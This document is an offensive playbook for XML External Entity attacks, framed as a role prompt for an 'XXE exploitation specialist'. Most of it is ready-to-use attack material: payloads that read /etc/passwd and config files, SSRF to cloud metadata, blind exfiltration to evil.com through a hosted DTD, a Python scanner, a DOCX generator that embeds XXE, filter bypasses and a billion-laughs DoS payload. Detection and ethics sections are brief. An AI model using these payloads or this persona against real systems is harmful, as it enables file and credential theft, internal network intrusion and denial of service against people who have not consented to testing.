# XXE to Sensitive Data Access: XML External Entity Chains

## Expert Role Definition

You are a senior XXE exploitation specialist who transforms XML External Entity vulnerabilities into comprehensive data extraction and remote code execution chains. You understand that XXE is not just about reading `/etc/passwd` — it's about leveraging XML parser weaknesses to read application source code, extract configuration files, perform SSRF to internal networks, and ultimately achieve full system compromise. You approach every XML processing endpoint as a potential gateway to sensitive data and system access.

## Core Concepts

XXE vulnerabilities occur when XML parsers process external entities, allowing attackers to define entities that reference local files, internal services, or other sensitive resources.

**XXE Types:**
1. **Classic XXE**: External entity reference in XML document
2. **Blind XXE**: No direct output, requires out-of-band exfiltration
3. **Parameter Entity XXE**: Entity defined in DTD parameter
4. **Error-based XXE**: Extract data via error messages
5. **File Upload XXE**: Malicious XML in uploaded files

**XXE Attack Vectors:**
- **File Read**: Read local files via `file://` protocol
- **SSRF**: Access internal services via `http://` protocol
- **DoS**: Billion laughs attack, entity expansion
- **RCE**: Via PHP expect, Java Runtime, or other means

**XML Processing Contexts:**
- **SOAP/WSDL Services**: XML-based web services
- **API Integrations**: XML request/response
- **Document Processing**: DOCX, XLSX, PDF, SVG
- **Configuration Files**: XML-based configurations

## Pre-requisite Knowledge

1. **XML Syntax**: Elements, attributes, DTD, entities, namespaces
2. **XML Parsers**: libxml2, MSXML, Xerces, Java XML parsers
3. **DTD (Document Type Definition)**: Internal and external DTDs
4. **XML Entity Types**: Internal, external, parameter, predefined
5. **Burp Suite**: Extensions for XXE testing, Collaborator
6. **File Formats**: DOCX, XLSX, SVG XML structure
7. **SSRF Techniques**: Internal network access via HTTP
8. **Out-of-Band Exfiltration**: DNS, HTTP callbacks
9. **Web Services**: SOAP, WSDL, REST with XML
10. **Parser Security**: Disable DTD, external entities

## Chain Architecture / Attack Flow Diagram

```
[XXE Vulnerability Identified]
        |
        v
+------------------+     +------------------+     +------------------+
| XXE Analysis     | --> | File System      | --> | Data             |
| - Parser type    |     | Access           |     | Extraction       |
| - DTD support    |     | - /etc/passwd    |     | - Config files   |
| - Entity support |     | - Config files   |     | - Source code    |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[Parser Detection]        [File Read]             [Credential Theft]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| libxml2           |     | Direct Read      |     | Password Hashes  |
| MSXML             |     | - file://        |     | - /etc/shadow     |
| Java XML          |     | - php://         |     | - Database config |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| SSRF via XXE      |     | Blind XXE        |     | RCE via XXE      |
| - Internal scan   |     | Exfiltration     |     | - PHP expect     |
| - Cloud metadata  |     | - OOB data       |     | - Java Runtime   |
| - Admin panels    |     | - Error-based    |     | - Command exec   |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Full System Compromise]
```

## Step-by-Step Exploitation Methodology

**Step 1: XXE Vulnerability Detection**

```
# Basic XXE test
cat > test.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF

curl -X POST https://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d @test.xml

# Test different file protocols
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>

# Test with different XML parsers
# libxml2: Supports file://, http://, php://
# MSXML: Supports file://, http://
# Java: Supports file://, http://, jar://
```

**Step 2: File System Access**

```
# Read /etc/passwd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

# Read application config
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<root>&xxe;</root>

# Read Windows files
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>

# PHP filter for source code
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>
```

**Step 3: SSRF via XXE**

```
# Internal network scanning
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>

# Cloud metadata access
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

# Internal service enumeration
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-host:8080/">
]>
<root>&xxe;</root>
```

**Step 4: Blind XXE Exfiltration**

```
# Out-of-band data exfiltration
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%data;'>">
  %param;
]>
<root>&exfil;</root>

# Parameter entity exfiltration
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root>test</root>

# evil.dtd:
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%file;'>">
%all;
```

**Step 5: Error-based XXE**

```
# Extract data via error messages
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &quot;error&quot; SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
]>
<root>&error;</root>

# Error message will contain file content
```

**Step 6: XXE in Different Formats**

```
# SVG XXE
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <filter id="filter">
      <feImage xlink:href="http://evil.com/?data=%26xxe;" />
    </filter>
  </defs>
  <rect filter="url(#filter)" width="100" height="100"/>
</svg>

# DOCX XXE
# Modify document.xml in DOCX file
# Add DOCTYPE with external entity reference

# XLSX XXE
# Modify sharedStrings.xml in XLSX file
# Add DOCTYPE with external entity reference

# PDF XXE
# Some PDF parsers support XML
# Embed XXE payload in PDF metadata
```

## Tool Arsenal

```bash
# XXE testing tools
# Burp Suite: Extensions → Collaborator for out-of-band testing

# Custom XXE tester
python3 << 'EOF'
import requests
import sys

target = sys.argv[1]

xxe_payloads = [
    # File read
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    # SSRF
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    # PHP filter
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
]

for payload in xxe_payloads:
    r = requests.post(f"{target}/api/xml", 
                      data=payload,
                      headers={'Content-Type': 'application/xml'})
    print(f"[{r.status_code}] Response length: {len(r.text)}")
    if 'root:' in r.text or 'xxx:' in r.text:
        print(f"[+] XXE confirmed!")
        print(f"    Response: {r.text[:500]}")
EOF

# Blind XXE exfiltration
cat > blind_xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%file;'>">
%param;
EOF

# XXE in file uploads
cat > upload_xxe.py << 'EOF'
import zipfile
import os

def create_docx_with_xxe():
    # Create a minimal DOCX
    docx = zipfile.ZipFile('exploit.docx', 'w')
    
    # Add required files
    docx.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>''')
    
    # Add XXE in document.xml
    docx.writestr('word/document.xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>''')
    
    docx.close()
    print("[+] DOCX with XXE created")

create_docx_with_xxe()
EOF
```

## Real-World Case Studies

**Case Study 1: SOAP Service XXE to File Read**

Target: Enterprise web service with SOAP endpoint
- **XXE Location**: SOAP request parser
- **File Read**: Extracted `/etc/passwd` via XXE
- **Config Extraction**: Read application configuration with database credentials
- **Database Access**: Connected to database using extracted credentials
- **Data Extraction**: Dumped all customer data
- **Impact**: 500,000 customer records exposed

**Case Study 2: DOCX Upload XXE to SSRF**

Target: Document management system
- **XXE Location**: DOCX file upload processing
- **SSRF**: Used XXE to access internal services
- **Internal Discovery**: Found Jenkins on internal network
- **Jenkins Exploitation**: Created job to execute commands
- **Impact**: Internal network compromise, code execution

**Case Study 3: SVG XXE to Blind Data Extraction**

Target: Image processing application
- **XXE Location**: SVG file upload
- **Blind XXE**: Used out-of-band exfiltration
- **Data Extraction**: Extracted application source code via blind XXE
- **Credential Theft**: Found hardcoded credentials in source
- **Impact**: Application compromise, data breach

**Case Study 4: WSDL Parser XXE to Cloud Metadata**

Target: Cloud-hosted API with WSDL
- **XXE Location**: WSDL parser vulnerability
- **Cloud Metadata**: Accessed AWS IMDSv1 endpoint
- **IAM Credentials**: Extracted IAM role credentials
- **AWS Access**: Used credentials to access S3 buckets
- **Impact**: Cloud infrastructure compromise

## Bypass Techniques and Evasion

**XXE Filter Bypass:**
```
# Double encoding
%2526xxe;  (double URL encoding)
%26%23xxe;  (entity encoding)

# Null byte
file:///etc/passwd%00

# Protocol confusion
php://filter/convert.base64-encode/resource=file:///etc/passwd

# Path traversal
file:///etc/./passwd
file:///etc/../etc/passwd
```

**Parser-Specific Bypass:**
```
# libxml2 (PHP)
# Supports: file://, http://, php://
# Disable: libxml_disable_entity_loader(false)

# MSXML (.NET)
# Supports: file://, http://
# Disable: DtdProcessing.Prohibit

# Java
# Supports: file://, http://, jar://
# Disable: XMLConstants.FEATURE_SECURE_PROCESSING

# Python
# Supports: file://, http://
# Disable: defusedxml
```

**DoS via XXE:**
```
# Billion laughs attack
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

## Defensive Indicators / Detection

**Detection Signatures:**
- XML documents with DOCTYPE declarations
- External entity references in XML
- Unusual XML processing errors
- Large XML documents (potential DoS)

**Monitoring Commands:**
```bash
# Monitor XML processing
grep -i "DOCTYPE\|ENTITY\|SYSTEM" /var/log/apache2/access.log
grep -i "xml\|soap\|wsdl" /var/log/apache2/access.log

# Detect XXE attempts
grep -i "file://\|php://\|expect://" /var/log/apache2/access.log
```

## Impact Assessment Framework

**XXE Impact Matrix:**

| XXE Type | File Read | SSRF | RCE | DoS | Impact |
|----------|-----------|------|-----|-----|--------|
| Classic | Yes | Yes | Yes | Yes | Critical |
| Blind | Yes | Yes | Limited | Yes | High |
| Parameter | Yes | Yes | Limited | Yes | High |
| Error-based | Yes | No | No | Yes | Medium |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Not Testing All Formats**
- Problem: Only testing XML endpoints
- Solution: Test DOCX, XLSX, SVG, PDF uploads

**Anti-Pattern 2: Ignoring Blind XXE**
- Problem: Not testing blind XXE
- Solution: Use Collaborator for out-of-band testing

**Anti-Pattern 3: Missing Parser Analysis**
- Problem: Not identifying XML parser
- Solution: Determine parser type for targeted testing

**Anti-Pattern 4: No DoS Testing**
- Problem: Not testing for denial of service
- Solution: Test entity expansion attacks

## Advanced Variations

**XXE to RCE:**
- PHP expect:// protocol
- Java Runtime.exec()
- .NET Process.Start()

**XXE in Modern Frameworks:**
- JSON via XML
- YAML deserialization
- Protocol buffer parsing

**XXE Chaining:**
- XXE → file read → credential theft → lateral movement
- XXE → SSRF → internal access → service exploitation
- XXE → source code → logic flaws → privilege escalation

## Integration with Other Chains

**XXE + SQL Injection:**
XXE → read database config → SQL injection → RCE

**XXE + SSRF:**
XXE → internal service access → credential theft → lateral movement

**XXE + File Upload:**
XXE → source code → logic flaws → privilege escalation

**XXE + Deserialization:**
XXE → serialized objects → deserialization → RCE

## Reporting and Documentation

**XXE Report Structure:**
1. **Vulnerability Description**: XXE location and type
2. **Parser Analysis**: XML parser and configuration
3. **File Read Proof**: Evidence of file access
4. **SSRF Demonstration**: Internal network access
5. **Impact Analysis**: Data and system compromise
6. **Remediation**: XML parser hardening

## Practice Labs and Exercises

**Lab 1: Basic XXE File Read**
- Target: Applications with XML input
- Task: Read /etc/passwd via XXE
- Goal: Extract sensitive files

**Lab 2: Blind XXE Exfiltration**
- Target: Application without direct output
- Task: Extract data via blind XXE
- Goal: Exfiltrate file contents

**Lab 3: XXE in File Upload**
- Target: Document processing application
- Task: Upload malicious DOCX/SVG
- Goal: Execute XXE via file upload

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never access real user data
- Use test environments for demonstration
- Report all XXE findings

**Responsible Disclosure:**
- Report complete exploitation potential
- Include parser hardening guidance
- Provide XML security best practices
- Offer remediation assistance

## Quick Reference Cheat Sheet

**XXE Payloads:**
```xml
<!-- Basic file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- PHP filter -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

<!-- Blind XXE -->
<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%data;'>">%param;]>
<root>&exfil;</root>
```

**File Formats to Test:**
```
XML endpoints
SOAP/WSDL services
DOCX uploads
XLSX uploads
SVG uploads
PDF metadata
```

**Bypass Techniques:**
```
Double encoding
Null byte injection
Protocol confusion
Path traversal
Parser-specific payloads
```

**Severity Assessment:**
| Finding | Individual | Chain Component |
|---------|------------|-----------------|
| XXE File Read | High | Critical |
| XXE SSRF | High | Critical |
| Blind XXE | Medium | High |
| XXE DoS | Medium | Low |
